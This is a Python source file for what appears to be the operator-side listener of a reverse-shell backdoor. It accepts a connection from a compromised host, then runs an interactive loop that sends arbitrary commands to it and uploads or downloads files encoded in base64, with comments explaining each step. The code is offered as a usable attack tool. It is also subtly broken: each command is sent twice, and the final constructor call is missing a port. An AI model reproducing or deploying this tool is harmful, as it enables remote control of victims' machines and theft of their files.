import socket
import json
import base64


class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # here socket.AF_INET is your ipv4 and
        # socket.SOCK_STREAM is your tcp/ip

        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # if fail to listen on port it will retry again
        server.bind((ip, port))
        server.listen(5)  # queue 5 clients can be use for multi client
        print("[+] Waiting for incoming connections")
        self.client, self.address = server.accept()  # it will return two objects client , address client is to
        # interact with connected client
        # address for ip and port of client
        print("[+] Got a connection from IP = " + str(self.address[0]) + " Port =  " + str(self.address[1]))

    def send_data(self, data):
        json_data = json.dumps(data)  # dump data into json object
        # why json for sending and receiving python data structures and to get full data from stream
        self.client.send(json_data.encode())  # send json object to client encode() is used for encoding it into bytes

    def receive_data(self):
        json_data = b""
        while True:  # receive until its done
            try:
                json_data = json_data + self.client.recv(1024)  # receive json object from client
                # print(json_data.__sizeof__()/1024, end='\r')
                return json.loads(json_data)  # unwrap json object
            except ValueError:
                continue  # if still data is pending continue the process

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())  # base64 is used to read unknown characters for images,videos etc

    def execute_command(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.client.close()
            exit()
        self.send_data(command)
        return self.receive_data()

    def write_file(self, path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))  # base64 is used to decode unknown characters
            return "[+] Download successful.";

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_data = self.read_file(command[1]).decode()
                    command.append(str(file_data))
                received_data = self.execute_command(command)
                if command[0] == "download" and "[-] Error" not in received_data:  # download file from connected
                    # computer
                    received_data = self.write_file(command[1], received_data)  # write file in file system

            except Exception as e:
                received_data = e

            print(str(received_data))


server = Server("", )  # provide your public ip and port
server.run()
